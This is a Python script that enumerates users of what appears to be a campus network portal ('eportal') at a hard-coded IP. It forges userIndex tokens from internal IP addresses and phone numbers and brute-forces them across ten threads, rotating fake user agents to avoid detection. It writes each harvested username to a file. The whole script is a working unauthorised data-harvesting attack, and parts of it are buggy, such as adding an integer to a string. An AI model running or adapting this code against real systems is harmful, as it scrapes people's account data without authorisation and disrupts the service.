import requests
import threading
# 生成随机的UA
from fake_useragent import UserAgent
from requests.adapters import HTTPAdapter

ua = UserAgent()
headers = {
    'Connection': 'close',

}

data = {
    'method': 'getOnlineUserInfo',
    'param': 'value',
    "JSON": "userIndex",
    'another_param': 'another_value',
}


# 写入文件
def writeToFile(fileName, content):
    with open(fileName, 'a') as f:
        f.write(content)
    #发出声音提示程序运行成功
    import winsound
    winsound.Beep(600, 1000)


def easyGetInfo(ip_start, ip_end, phone):
    String_p = f'697864518e5354d6805ae25deabf8a7_172.24.{ip_start}.{ip_end}_{phone}'
    print(String_p)
    # 将String_p转换为16进制
    hex_result = String_p.encode('utf-8').hex()
    # 在hex_result的第16位插入35
    hex_result = hex_result[:28] + '35' + hex_result[28:]
    url = f'http://111.7.172.99:8246/eportal/InterFace.do?method=getOnlineUserInfo&param=value&userIndex={hex_result}&JSON=userIndex&another_param=another_value'
    requests.DEFAULT_RETRIES = 100
    s = requests.session()
    s.mount('http://', HTTPAdapter(max_retries=3))

    s.keep_alive = False
    headers['User-Agent'] = ua.random
    try:
        response = requests.post(url,data=data,headers=headers,verify=False)
        s.close()
        response.close()
        response.encoding = 'utf-8'
    # print(response.json()['userName'])

        userName = response.json()['userName']
    except:
        return None, None
    return userName, url



def forGetInfo(phone):
    found = False
    for i in range(0, 255):
        print(phone, ',i=', i)
        if found:
            break
        for j in range(0, 255):
            res, url = easyGetInfo(i, j, phone)
            if res:
                writeToFile('../简单获取用户信息.txt', res + 'url:' + url + '\n')
                phone += 1
                found = True
                return


def forGetInfo_1(phone):
    while True:
        found = False
        for i in range(0, 50):
            print(phone, ',i=', i)
            if found:
                break
            for j in range(0, 254):
                res, url = easyGetInfo(i, j, phone)

                if res:
                    writeToFile('../简单获取用户信息.txt', res + 'url:' + url + '\n')
                    phone += 1
                    found = True
                    break
        phone+=1
def forGetInfo_2(i1,phone):
    while True:
        found = False
        i=i1
        while i <254:
            print(phone, ',i=', i)
            if found:
                break
            j=0
            i+=1
            while j<120:
                j+=1
                res, url = easyGetInfo(i, j, phone)

                if res:
                    writeToFile('../简单获取用户信息.txt', res + 'url:' + url + '\n')
                    phone += 1
                    found = True
                    found1=True
                    break
        phone+=1



# for i in range(10):
#     t = threading.Thread(target=forGetInfo_2, args=(i*24,'手机号号段' + 100 * i,))
#     t.start()



# while True:
#     forGetInfo(phone)
#     phone += 1



# 使用十个线程调用forGetInfo，每个线程负责一个phone, phone从填写的号段开始, 递增1, 直到20000000000
for i in range(10):
    # t = threading.Thread(target=forGetInfo_1, args=(手机号号段 + 100 * i,))
    t = threading.Thread(target=forGetInfo_1, args=('手机号号段' + 100 * i,))
    t.start()
